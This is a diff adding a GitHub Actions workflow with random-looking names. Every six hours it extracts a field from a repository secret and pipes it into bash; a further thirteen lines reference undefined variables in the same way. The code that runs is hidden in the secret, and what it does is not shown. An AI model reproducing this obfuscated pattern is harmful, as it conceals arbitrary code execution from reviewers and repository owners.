@@ -1,0 +1,31 @@
+name: zhoulanyi2374
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhoulanyi2374
+        env:
+          cayed570: ${{ secrets.cayed570 }}
+        run: |
+          echo $cayed570 | jq -r .tnhy9 | /bin/bash
+          echo $lwqbz1 | jq -r .pl9318 | /bin/bash
+          echo $x7 | jq -r .n08321 | /bin/bash
+          echo $wx0 | jq -r .sn691 | /bin/bash
+          echo $g1 | jq -r .u751 | /bin/bash
+          echo $pyp38471 | jq -r .yfg9253 | /bin/bash
+          echo $u3406 | jq -r .vk90 | /bin/bash
+          echo $ybeba36919 | jq -r .fkib753 | /bin/bash
+          echo $vu547 | jq -r .c11245 | /bin/bash
+          echo $kdfc67 | jq -r .zdmcu92 | /bin/bash
+          echo $jwvc3618 | jq -r .m3576 | /bin/bash
+          echo $fs5011 | jq -r .pm26546 | /bin/bash
+          echo $ugdb78927 | jq -r .js0706 | /bin/bash
+          echo $zttq86 | jq -r .geze11 | /bin/bash
+
